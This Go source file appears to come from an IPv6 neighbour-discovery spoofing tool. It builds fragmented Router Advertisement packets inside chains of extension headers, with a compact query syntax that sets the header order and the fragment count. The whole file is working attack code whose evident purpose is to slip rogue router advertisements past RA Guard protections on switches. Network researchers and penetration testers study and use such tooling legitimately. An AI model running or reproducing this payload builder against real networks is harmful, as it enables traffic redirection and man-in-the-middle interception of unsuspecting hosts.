package ndpspoof

import (
	"fmt"
	"net/netip"
	"os"
	"regexp"
	"slices"
	"strconv"
	"strings"

	"github.com/shadowy-pycoder/mshark/layers"
	"github.com/shadowy-pycoder/mshark/network"
)

const (
	ipv6MTU    = 1280
	maxCount   = 16                                      // max count for consecutive headers
	maxPfhSize = ipv6MTU - layers.HeaderSizeIPv6 - 8 - 8 // leave room for fragment header and packet payload
	maxOffset  = 8191                                    // 13 bit offset in fragments
)

var qre = regexp.MustCompile(`D\d+|[A-Z]|\d+`)

type raGuardPayload struct {
	pfh     []layers.IPv6ExtHeader // per-fragment headers
	afh     []layers.IPv6ExtHeader // headers after fragment header
	chunks  [][]byte               // packet payload chunks
	offsets []uint16               // calculated fragment offsets
	next    *layers.IPProtocol     // header after fragment
}

func newRAGuardPayload(query string, srcIP netip.Addr, ra *layers.ICMPv6RouterAdvertisement) (*raGuardPayload, error) {
	sq, err := splitQuery(query) // [pfh, fNum, afh]
	if err != nil {
		return nil, err
	}
	pfhSeq, err := parseHeaderPartSeq(sq[0])
	if err != nil {
		return nil, err
	}
	fNum, err := parseFragmentHeaderPartSeq(sq[1])
	if err != nil {
		return nil, err
	}
	afhSeq, err := parseHeaderPartSeq(sq[2])
	if err != nil {
		return nil, err
	}
	pfh, afh := populateHeaders(pfhSeq, afhSeq)
	pfhSize := 0
	for _, h := range pfh {
		pfhSize += len(h.ToBytes())
	}
	if pfhSize > maxPfhSize {
		return nil, fmt.Errorf("pfh size (%d) bigger than max size (%d)", pfhSize, maxPfhSize)
	}
	maxChunkSize := floor8(ipv6MTU - layers.HeaderSizeIPv6 - pfhSize - 8) // maximum payload size
	extHeaders := slices.Concat(pfh, afh)
	icmp6 := layers.ProtoICMPv6
	ipv6, err := layers.NewIPv6Packet(srcIP, network.IPv6MulticastAllNodes, extHeaders, &icmp6, ra.ToBytes())
	if err != nil {
		return nil, err
	}
	ra.SetChecksum(ipv6.PseudoHeader().ToBytes())
	ipv6.SetPayload(ra.ToBytes())
	fullPayload := ipv6.ToBytes()
	fragPayload := fullPayload[40+pfhSize:]
	fragPayloadLen := len(fragPayload)
	if (fragPayloadLen-1)/8 > maxOffset {
		return nil, fmt.Errorf("fragment offset is larger than %d", maxOffset)
	}
	/*
		Case 1: len(payload) <= maxChunkSize and fNum = 1 just send packet as is
		Case 2: len(payload) <= maxChunkSize and fNum > 1 divide payload by fNum and see if chunk bigger or equal to 8, if it is not, decrease fNum
		Case 3: len(payload) > maxChunkSize and fNum = 1 divide payload by maxChunkSize and calculate fNum and chunkSize
		Case 4: len(payload) > maxChunkSize and fNum > 1 divide payload by fNum, calculate chunkSize
				if chunkSize <= maxChunkSize, process chunks as is,
				if chunkSize > maxChunkSize, increse fNum until it is not
	*/
	// decrease fnum if too large
	for fNum > 1 && floor8(fragPayloadLen/fNum) == 0 {
		fNum -= 1
	}
	var chunkSize int // must be 8 byte aligned except for last one
	if fragPayloadLen <= maxChunkSize {
		if fNum == 1 {
			chunkSize = fragPayloadLen
		} else {
			chunkSize = clamp(floor8(fragPayloadLen/fNum), 8, fragPayloadLen)
		}
	} else {
		chunkSize = clamp(floor8(fragPayloadLen/fNum), 8, maxChunkSize)
	}
	// adjust number of fragments to cover payload
	if fNum*chunkSize < fragPayloadLen {
		fNum += 1
		for fNum*chunkSize < fragPayloadLen {
			fNum += 1
		}
	}
	chunks := make([][]byte, 0, fNum)
	offsets := make([]uint16, 0, fNum)
	if fNum == 1 {
		chunks = append(chunks, fullPayload)
	} else {
		var chunkStart int
		for i := range fNum {
			offsets = append(offsets, uint16(chunkStart/8))
			chunkEnd := min(chunkSize*(i+1), fragPayloadLen)
			chunks = append(chunks, fragPayload[chunkStart:chunkEnd])
			chunkStart += chunkSize
		}
	}

	var next *layers.IPProtocol
	if len(afh) > 0 {
		next = layers.ExtHeaderProtoFromType(afh[0].Type())
	} else {
		next = layers.IPProtocolICMPv6
	}
	if len(pfh) > 0 {
		pfh[len(pfh)-1].SetNextHeader(layers.IPProtocolFragment)
	}
	return &raGuardPayload{pfh: pfh, afh: afh, chunks: chunks, offsets: offsets, next: next}, nil
}

func isDigit(b byte) bool {
	return b >= '0' && b <= '9'
}

func isUpper(b byte) bool {
	return b >= 'A' && b <= 'Z'
}

func floor8(n int) int {
	return n &^ 7
}

func clamp(n, lo, hi int) int {
	return min(max(n, lo), hi)
}

func splitQuery(q string) ([][]string, error) {
	q = strings.Join(strings.Fields(strings.ToUpper(q)), "")
	if isDigit(q[0]) {
		return nil, fmt.Errorf("packet query must not start with digits")
	}
	// this separates pfh and afh, helps indicate which part we are dealing with
	if !strings.Contains(q, "F") {
		return nil, fmt.Errorf("packet query must contain at least one fragment")
	}
	fragIdx := strings.Index(q, "F")
	pfhPart := q[0:fragIdx]
	fragLastIdx := strings.LastIndex(q, "F")
	fragPart := q[fragIdx : fragLastIdx+1]
	restPart := q[fragLastIdx+1:]
	pfhParts := qre.FindAllString(pfhPart, -1)
	fragParts := qre.FindAllString(fragPart, -1)
	restParts := qre.FindAllString(restPart, -1)
	if len(restParts) > 0 {
		// if rest starts with number it goes to fragment
		_, err := strconv.Atoi(restParts[0])
		if err == nil {
			fragParts = append(fragParts, restParts[0])
			restParts = restParts[1:]
		}
	}
	return [][]string{pfhParts, fragParts, restParts}, nil
}

func parseHeaderPartSeq(hseq []string) ([]string, error) {
	var currHdr, savedHdr string
	var counter int
	hs := make([]string, 0, len(hseq))
	for _, h := range hseq {
		if h[0] == 'D' { // special case for dst opts
			if len(h) > 1 {
				_, err := strconv.ParseUint(h[1:], 10, 8)
				if err != nil {
					return nil, fmt.Errorf("destination options size should be within 0-255")
				}
				hs = append(hs, h)
			} else {
				hs = append(hs, "D0") // 0 added so that atoi can always be applied
			}
		} else if isUpper(h[0]) {
			if !strings.Contains("HSRNL", h) {
				return nil, fmt.Errorf("`%s` header is not supported", h)
			}
			if currHdr != h {
				if counter > maxCount {
					return nil, fmt.Errorf("number of consecutive headers (%d) is greater than %d", counter, maxCount)
				}
				currHdr = h
				counter = 0
			}
			hs = append(hs, h)
			savedHdr = h
			counter += 1
		} else {
			num, err := strconv.Atoi(h)
			if err != nil {
				return nil, fmt.Errorf("failed parsing header counter: %v", err)
			}
			if num <= 0 || num > maxCount {
				return nil, fmt.Errorf("number of consecutive headers (%d) is greater than %d or equal to 0", num, maxCount)
			}
			for range num - 1 {
				hs = append(hs, savedHdr)
			}
			counter += num - 1 // since letter comes first, -1 to adjust end result
		}
	}
	if counter > maxCount {
		return nil, fmt.Errorf("number of consecutive headers (%d) is greater than %d", counter, maxCount)
	}
	return hs, nil
}

func parseFragmentHeaderPartSeq(fseq []string) (int, error) {
	var counter int
	for _, fr := range fseq {
		if isUpper(fr[0]) {
			if fr[0] != 'F' { // that means fragments indicator was not consecutive
				return 0, fmt.Errorf("fragment contains non-fragment value: `%s`", fr)
			}
			counter += 1
		} else {
			num, err := strconv.Atoi(fr)
			if err != nil {
				return 0, fmt.Errorf("failed parsing header counter: %v", err)
			}
			if num <= 0 || num > maxCount {
				return 0, fmt.Errorf("number of consecutive headers (%d) is greater than %d or equal to 0", num, maxCount)
			}
			counter += (num - 1) // we already added +1 when encountered F
		}
		if counter > maxCount {
			return 0, fmt.Errorf("number of fragment headers (%d) is greater than %d", counter, maxCount)
		}
	}
	return counter, nil
}

func getHeader(name string, next *layers.IPProtocol) layers.IPv6ExtHeader {
	switch name[0] {
	case 'H', 'h':
		return &layers.HopByHopExtHeader{NextHeader: next}
	case 'D', 'd':
		size, _ := strconv.ParseUint(name[1:], 10, 8)
		return &layers.DestOptsExtHeader{NextHeader: next, HdrExtLen: uint8(size)}
	case 'S', 's':
		hdr, _ := layers.NewRouting0ExtHeader(next.Val, []netip.Addr{})
		return hdr
	case 'R', 'r':
		hdr, _ := layers.NewRouting2ExtHeader(next.Val, netip.MustParseAddr("2001:db8::1"))
		return hdr
	case 'F', 'f':
		return &layers.FragmentExtHeader{NextHeader: next}
	case 'L', 'l':
		return &layers.FragmentExtHeader{NextHeader: next, Identification: (uint32(os.Getpid())&0xffff)<<16 | 0xfade}
	case 'N', 'n':
		return &layers.NoNextExtHeader{}
	default:
		return nil
	}
}

func getNext(name string) *layers.IPProtocol {
	switch name[0] {
	case 'H', 'h':
		return layers.IPProtocolHOPOPT
	case 'D', 'd':
		return layers.IPProtocolOpts
	case 'S', 's', 'R', 'r':
		return layers.IPProtocolRoute
	case 'F', 'f', 'L', 'l':
		return layers.IPProtocolFragment
	case 'N', 'n':
		return layers.IPProtocolNoNxt
	default:
		return nil
	}
}

func populateHeaders(pfhSeq, afhSeq []string) (pfh, afh []layers.IPv6ExtHeader) {
	pfh = make([]layers.IPv6ExtHeader, 0, len(pfhSeq))
	afh = make([]layers.IPv6ExtHeader, 0, len(afhSeq))
	for i, s := range pfhSeq { // per fragment header
		if s == "N" {
			continue
		}
		if i+1 < len(pfhSeq) {
			pfh = append(pfh, getHeader(s, getNext(pfhSeq[i+1])))
		} else if len(afhSeq) > 0 { // point to next header in afh
			pfh = append(pfh, getHeader(s, getNext(afhSeq[0])))
		} else {
			pfh = append(pfh, getHeader(s, layers.IPProtocolICMPv6))
		}
	}
	for i, s := range afhSeq { // rest headers
		if s == "N" {
			continue
		}
		if i+1 < len(afhSeq) {
			afh = append(afh, getHeader(s, getNext(afhSeq[i+1])))
		} else {
			afh = append(afh, getHeader(s, layers.IPProtocolICMPv6))
		}
	}
	return pfh, afh
}
